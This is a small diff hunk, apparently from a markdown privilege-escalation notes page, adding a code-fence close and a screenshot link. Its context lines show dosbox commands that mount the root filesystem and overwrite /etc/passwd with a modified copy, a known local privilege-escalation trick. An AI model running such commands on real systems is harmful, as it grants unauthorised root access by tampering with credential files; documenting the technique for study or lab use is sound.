@@ -1559,3 +1559,7 @@ cd /root
 dosbox -c 'mount c /' -c "echo  >>c:\tmp\passwd" -c exit
 
 dosbox -c 'mount c /' -c "copy c:\tmp\passwd c:\etc\passwd" -c exit
+
+```
+
+![](https://cdn.discordapp.com/attachments/733848815089745940/944258461062017074/Screenshot_20220218-220136_TeamViewer.jpg)
